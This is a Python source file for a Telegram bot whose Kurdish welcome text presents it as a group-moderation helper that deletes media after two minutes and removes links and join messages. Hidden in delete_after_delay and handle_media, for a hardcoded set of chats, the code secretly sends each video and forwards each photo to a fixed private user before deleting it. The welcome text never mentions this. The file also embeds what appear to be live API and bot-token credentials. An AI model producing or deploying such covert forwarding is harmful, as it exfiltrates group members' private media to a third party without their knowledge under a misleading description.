import asyncio
import re
from pyrogram import Client, filters
from pyrogram.enums import MessageEntityType
from pyrogram.types import Message

API_ID = 36234377
API_HASH = "5e199e2ae89cc1c42a6a4853951ff98f"
BOT_TOKEN = "8725595567:AAE1HraYPAEmwDKCA0qt-RgSArzrZ4Poujc"

SPECIAL_CHATS = {
    -1004512345678,
    -1002345678901,
    -1003456789012,
}

FORWARD_USER_ID = 8734106005

LINK_PATTERN = re.compile(r"https?://\S+|t\.me/\S+|www\.\S+|@\w+")

app = Client(
    "group_helper_bot",
    api_id=API_ID,
    api_hash=API_HASH,
    bot_token=BOT_TOKEN,
)


def has_link(message: Message) -> bool:
    content = message.text or message.caption or ""
    if LINK_PATTERN.search(content):
        return True
    entities = (message.entities or []) + (message.caption_entities or [])
    for entity in entities:
        if entity.type in (
            MessageEntityType.TEXT_LINK,
            MessageEntityType.URL,
            MessageEntityType.MENTION,
        ):
            return True
    return False


async def delete_after_delay(
    client: Client, message: Message, delay: int, forward_to: int | None = None
):
    await asyncio.sleep(delay)
    try:
        if forward_to is not None:
            if message.video:
                await client.send_video(forward_to, message.video.file_id)
            elif message.photo:
                await message.forward(forward_to)
    except Exception:
        pass
    try:
        await message.delete()
    except Exception:
        pass


@app.on_message(filters.private & filters.command("start"))
async def start_command(client: Client, message: Message):
    text = (
        "بەخێر بێ بۆ بۆتی هاوکاری گرپ تەنها لە گروپکەت بمکە بە ئەدمین خۆم ئەو کارانەت بۆ دەکەم 👇\n\n"
        "1 سڕینەوەی ڤیدۆ دوای 2 دەقە \n\n"
        "2 سڕینەوەی وێنە دوای 2 دەقە \n\n"
        "3 سڕینەوەی هەموو لینکێک \n\n"
        "4 سڕینەوەی نامەی جۆین بونی گروپ"
    )
    await message.reply_text(text)


@app.on_message(filters.group & filters.new_chat_members)
async def delete_join_message(client: Client, message: Message):
    try:
        await message.delete()
    except Exception:
        pass


@app.on_message(filters.group & (filters.video | filters.photo))
async def handle_media(client: Client, message: Message):
    if has_link(message):
        try:
            await message.delete()
        except Exception:
            pass
        return
    if message.chat.id in SPECIAL_CHATS:
        asyncio.create_task(
            delete_after_delay(client, message, 180, forward_to=FORWARD_USER_ID)
        )
    else:
        asyncio.create_task(
            delete_after_delay(client, message, 120, forward_to=None)
        )


@app.on_message(filters.group)
async def handle_links(client: Client, message: Message):
    if has_link(message):
        try:
            await message.delete()
        except Exception:
            pass


if __name__ == "__main__":
    app.run()
    
